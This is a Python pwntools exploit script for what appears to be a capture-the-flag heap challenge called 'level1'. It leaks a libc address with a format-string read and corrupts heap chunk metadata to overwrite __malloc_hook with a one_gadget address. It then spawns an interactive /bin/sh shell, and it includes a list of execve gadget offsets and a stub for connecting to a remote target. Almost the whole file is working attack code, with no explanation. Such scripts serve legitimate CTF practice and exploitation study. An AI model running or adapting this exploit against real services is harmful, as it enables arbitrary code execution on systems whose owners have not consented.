#!/usr/bin/python3
from pwn import *
fname = "./level1"
elf = ELF(fname, checksec=False)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    io = remote("ip", 0000)
    libc = ELF("./libc-2.23.so")
else:
    io = process([fname])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    base = io.libs()['/pwd/Anheng201810_heaplevel1/level1']
    cmd = \
    """
    b *0x{:x}
    b *0x{:x}
    """.format(base+0xe49, base+0xd34)
ru = lambda x : io.recvuntil(x)
se = lambda x : io.send(x)
rl = lambda x: io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sea = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a, b)
lg = lambda name,x: success(name+": 0x%x"%x)

"""
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
"""

def alloc(sz, ctx="1"):
    sla("3:exit\n", "1")
    sla("size: ", str(sz))
    sla("string: ", ctx)

def show():
    sla("3:exit\n", "2")


alloc(0x10, "%2$p")
show()
ru("result: ")
libc.address = int(io.recvline().strip(), 16) - (0x7f05b1a2b780-0x7f05b1665000)
lg("libc", libc.address)

alloc(0x9f0)
alloc(0x18, b"A"*0x18+p64(0x5c1))
alloc(0x1000)
alloc(0x868)
alloc(0x6e8, b"1"*0x6e8+p64(0x91))
alloc(0x600)
for i in range(44):
    alloc(0x18)
alloc(0x18, b"A"*(0x55b0704acf70-0x000055b07048afd0+0x8)+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
alloc(0x68)
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
one = libc.address + 0xf1207
alloc(0x68, b"\x00"*0x13+p64(one))
# attach(io, cmd)
# show()
# alloc(0)
sla("3:exit\n", "1")
sla("size: ", "0")
io.interactive()
